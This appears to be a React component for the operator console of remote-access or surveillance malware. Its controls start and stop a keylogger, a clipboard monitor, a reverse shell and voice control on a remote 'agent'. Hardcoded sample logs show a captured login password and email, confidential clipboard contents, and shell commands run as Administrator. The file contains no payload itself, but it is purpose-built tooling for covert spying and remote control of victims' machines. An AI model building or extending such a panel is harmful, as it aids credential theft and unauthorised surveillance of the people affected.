import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';
import { 
  Keyboard, 
  Clipboard, 
  Terminal, 
  Mic,
  Download,
  Upload,
  Play,
  Square,
  Trash2,
  Eye
} from 'lucide-react';

interface MonitoringControlPanelProps {
  agentId: string;
  monitoring: {
    keylogger: { active: boolean; keyCount: number; lastActivity: string };
    clipboard: { active: boolean; clipCount: number; lastClipboard: string };
    reverseShell: { active: boolean; commandCount: number; lastCommand: string };
    voiceControl: { active: boolean; commandCount: number; lastCommand: string };
  };
  onMonitoringAction: (type: string, action: string, params?: any) => void;
}

const MonitoringControlPanel: React.FC<MonitoringControlPanelProps> = ({
  agentId,
  monitoring,
  onMonitoringAction
}) => {
  const [activeTab, setActiveTab] = useState('keylogger');
  const [keylogData] = useState([
    { timestamp: '2024-01-15 14:30:25', keys: 'password123', window: 'Chrome - Login' },
    { timestamp: '2024-01-15 14:29:15', keys: 'john.doe@email.com', window: 'Chrome - Login' },
    { timestamp: '2024-01-15 14:28:45', keys: 'Hello World!', window: 'Notepad' },
  ]);

  const [clipboardData] = useState([
    { timestamp: '2024-01-15 14:32:10', content: 'https://example.com/secret-document', type: 'URL' },
    { timestamp: '2024-01-15 14:31:05', content: 'Confidential meeting notes...', type: 'Text' },
    { timestamp: '2024-01-15 14:30:30', content: 'C:\\Users\\Admin\\Documents\\passwords.txt', type: 'Path' },
  ]);

  const [shellHistory] = useState([
    { timestamp: '2024-01-15 14:35:20', command: 'whoami', output: 'DESKTOP-ABC123\\Administrator' },
    { timestamp: '2024-01-15 14:34:15', command: 'dir C:\\Users', output: 'Directory listing...' },
    { timestamp: '2024-01-15 14:33:10', command: 'systeminfo', output: 'System information...' },
  ]);

  const MonitoringToggle = ({ 
    type, 
    icon: Icon, 
    label, 
    data, 
    showLogs = false 
  }: {
    type: string;
    icon: any;
    label: string;
    data: any;
    showLogs?: boolean;
  }) => (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Icon className="w-5 h-5" />
          <span className="font-medium">{label}</span>
          <Badge variant={data.active ? "default" : "secondary"}>
            {data.active ? "Active" : "Inactive"}
          </Badge>
        </div>
        <div className="flex gap-2">
          <Button
            variant={data.active ? "destructive" : "default"}
            size="sm"
            onClick={() => onMonitoringAction(type, data.active ? 'stop' : 'start')}
          >
            {data.active ? <Square className="w-4 h-4 mr-1" /> : <Play className="w-4 h-4 mr-1" />}
            {data.active ? 'Stop' : 'Start'}
          </Button>
          {showLogs && (
            <Button
              variant="outline"
              size="sm"
              onClick={() => onMonitoringAction(type, 'view_logs')}
            >
              <Eye className="w-4 h-4 mr-1" />
              View Logs
            </Button>
          )}
          <Button
            variant="outline"
            size="sm"
            onClick={() => onMonitoringAction(type, 'clear')}
          >
            <Trash2 className="w-4 h-4 mr-1" />
            Clear
          </Button>
        </div>
      </div>

      {data.active && (
        <div className="grid grid-cols-3 gap-4 text-sm">
          <div>
            <span className="text-muted-foreground">Count:</span>
            <div className="font-mono">{data.keyCount || data.clipCount || data.commandCount}</div>
          </div>
          <div className="col-span-2">
            <span className="text-muted-foreground">Last Activity:</span>
            <div className="font-mono text-xs">{data.lastActivity || data.lastClipboard || data.lastCommand}</div>
          </div>
        </div>
      )}
    </div>
  );

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Keyboard className="w-5 h-5" />
          Monitoring & Input Control - Agent {agentId}
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid w-full grid-cols-4">
            <TabsTrigger value="keylogger">Keylogger</TabsTrigger>
            <TabsTrigger value="clipboard">Clipboard</TabsTrigger>
            <TabsTrigger value="shell">Shell</TabsTrigger>
            <TabsTrigger value="voice">Voice</TabsTrigger>
          </TabsList>

          <TabsContent value="keylogger" className="mt-4 space-y-4">
            <MonitoringToggle
              type="keylogger"
              icon={Keyboard}
              label="Keylogger"
              data={monitoring.keylogger}
              showLogs={true}
            />

            {monitoring.keylogger.active && (
              <div className="space-y-2">
                <span className="text-sm font-medium">Recent Keystrokes:</span>
                <ScrollArea className="h-32 border rounded p-2">
                  {keylogData.map((entry, index) => (
                    <div key={index} className="text-xs space-y-1 mb-2">
                      <div className="flex justify-between text-muted-foreground">
                        <span>{entry.timestamp}</span>
                        <span>{entry.window}</span>
                      </div>
                      <div className="font-mono bg-muted p-1 rounded">{entry.keys}</div>
                    </div>
                  ))}
                </ScrollArea>
              </div>
            )}
          </TabsContent>

          <TabsContent value="clipboard" className="mt-4 space-y-4">
            <MonitoringToggle
              type="clipboard"
              icon={Clipboard}
              label="Clipboard Monitor"
              data={monitoring.clipboard}
              showLogs={true}
            />

            {monitoring.clipboard.active && (
              <div className="space-y-2">
                <span className="text-sm font-medium">Clipboard History:</span>
                <ScrollArea className="h-32 border rounded p-2">
                  {clipboardData.map((entry, index) => (
                    <div key={index} className="text-xs space-y-1 mb-2">
                      <div className="flex justify-between text-muted-foreground">
                        <span>{entry.timestamp}</span>
                        <Badge variant="outline" className="text-xs">{entry.type}</Badge>
                      </div>
                      <div className="font-mono bg-muted p-1 rounded truncate">{entry.content}</div>
                    </div>
                  ))}
                </ScrollArea>
              </div>
            )}
          </TabsContent>

          <TabsContent value="shell" className="mt-4 space-y-4">
            <MonitoringToggle
              type="reverseShell"
              icon={Terminal}
              label="Reverse Shell"
              data={monitoring.reverseShell}
              showLogs={true}
            />

            {monitoring.reverseShell.active && (
              <div className="space-y-2">
                <span className="text-sm font-medium">Command History:</span>
                <ScrollArea className="h-32 border rounded p-2">
                  {shellHistory.map((entry, index) => (
                    <div key={index} className="text-xs space-y-1 mb-2">
                      <div className="text-muted-foreground">{entry.timestamp}</div>
                      <div className="font-mono bg-muted p-1 rounded">
                        <div className="text-green-600">$ {entry.command}</div>
                        <div className="text-gray-600 mt-1">{entry.output}</div>
                      </div>
                    </div>
                  ))}
                </ScrollArea>
              </div>
            )}
          </TabsContent>

          <TabsContent value="voice" className="mt-4 space-y-4">
            <MonitoringToggle
              type="voiceControl"
              icon={Mic}
              label="Voice Control"
              data={monitoring.voiceControl}
              showLogs={true}
            />

            {monitoring.voiceControl.active && (
              <div className="space-y-2">
                <span className="text-sm font-medium">Voice Commands:</span>
                <div className="text-xs text-muted-foreground">
                  Listening for voice commands... Last command: "{monitoring.voiceControl.lastCommand}"
                </div>
              </div>
            )}
          </TabsContent>
        </Tabs>

        <Separator className="my-4" />

        <div className="grid grid-cols-2 gap-4 text-sm">
          <div className="flex items-center gap-2">
            <Keyboard className="w-4 h-4" />
            <span>Keys: {monitoring.keylogger.keyCount}</span>
          </div>
          <div className="flex items-center gap-2">
            <Clipboard className="w-4 h-4" />
            <span>Clips: {monitoring.clipboard.clipCount}</span>
          </div>
          <div className="flex items-center gap-2">
            <Terminal className="w-4 h-4" />
            <span>Commands: {monitoring.reverseShell.commandCount}</span>
          </div>
          <div className="flex items-center gap-2">
            <Mic className="w-4 h-4" />
            <span>Voice: {monitoring.voiceControl.commandCount}</span>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default MonitoringControlPanel;